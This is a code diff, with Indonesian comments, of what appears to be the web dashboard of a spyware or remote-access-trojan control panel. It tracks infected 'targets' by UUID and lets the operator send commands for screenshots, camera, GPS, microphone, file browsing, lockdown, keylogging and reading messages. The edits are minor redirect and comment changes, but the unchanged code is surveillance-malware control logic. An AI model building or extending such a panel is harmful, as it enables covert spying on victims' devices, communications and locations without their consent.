@@ -57,7 +57,7 @@
     </div>
     <script type="module">
         // ================================================================
-        // DASHBOARD LOGIC — DENGAN LOG LENGKAP
+        // 🔥 DASHBOARD UTAMA — DENGAN TOKEN CHECK
         // ================================================================
         import { API_BASE } from './js/config.js';
 
@@ -67,12 +67,15 @@
         const token = localStorage.getItem('token');
         console.log('🔹 Token from localStorage:', token ? token.substring(0, 20) + '...' : 'null');
 
+        // 🔥 JIKA TOKEN TIDAK ADA, REDIRECT KE LOGIN
         if (!token) {
             console.log('❌ No token found, redirecting to login');
-            window.location.href = 'index.html';
-            // Hentikan eksekusi lebih lanjut
-            throw new Error('Redirecting to login');
+            window.location.replace('index.html');
+            // Hentikan eksekusi
+            throw new Error('Redirect to login');
         }
+
+        console.log('✅ Token valid, loading dashboard...');
 
         // ================================================================
         // FUNGSI LOGOUT
@@ -81,11 +84,11 @@
             console.log('🔹 Logout called');
             localStorage.removeItem('token');
             localStorage.removeItem('api_base');
-            window.location.href = 'index.html';
+            window.location.replace('index.html');
         };
 
         // ================================================================
-        // FETCH TARGETS (dari REST API)
+        // FETCH TARGETS
         // ================================================================
         async function loadTargets() {
             console.log('🔹 Loading targets...');
@@ -155,7 +158,6 @@
             document.getElementById('totalTargets').innerText = total;
             document.getElementById('onlineTargets').innerText = online;
             document.getElementById('offlineTargets').innerText = offline;
-            // Commands executed (bisa diambil dari API terpisah, tapi untuk demo kita set 0)
             document.getElementById('totalCommands').innerText = '0';
         }
 
@@ -194,7 +196,7 @@
         }
 
         // ================================================================
-        // CONTROL TARGET (kirim perintah via REST)
+        // CONTROL TARGET
         // ================================================================
         window.controlTarget = function(uuid) {
             const cmd = prompt(`Commands for ${uuid}:\n1: screenshot\n2: camera\n3: gps\n4: mic\n5: file_explorer\n6: lockdown\n7: keylog\n8: read_messages\n\nEnter command number:`);
@@ -224,7 +226,7 @@
         };
 
         // ================================================================
-        // VIEW TARGET DETAIL (redirect ke target.html)
+        // VIEW TARGET DETAIL
         // ================================================================
         window.viewTarget = function(uuid) {
             window.location.href = 'target.html?uuid=' + encodeURIComponent(uuid);
@@ -235,7 +237,7 @@
         // ================================================================
         console.log('🔹 Initializing dashboard...');
         loadTargets();
-        setInterval(loadTargets, 15000); // refresh setiap 15 detik
+        setInterval(loadTargets, 15000);
     </script>
 </body>
 </html>
